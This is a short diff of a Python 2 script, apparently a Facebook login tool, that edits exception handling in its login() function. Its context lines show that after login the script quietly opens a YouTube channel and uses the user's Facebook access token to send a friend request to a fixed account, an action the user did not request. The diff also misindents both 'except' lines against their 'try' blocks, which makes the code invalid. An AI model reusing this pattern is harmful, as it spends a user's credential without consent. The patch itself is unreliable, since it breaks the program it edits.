@@ -226,7 +226,7 @@ def login():
 	tik()
 	try:
 			br.open('https://m.facebook.com')
-		except mechanize.URLError:
+			except mechanize.URLError:
 			print"\n\x1b[1;91mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
@@ -253,7 +253,7 @@ def login():
 				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
-			except requests.exceptions.ConnectionError:
+				except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
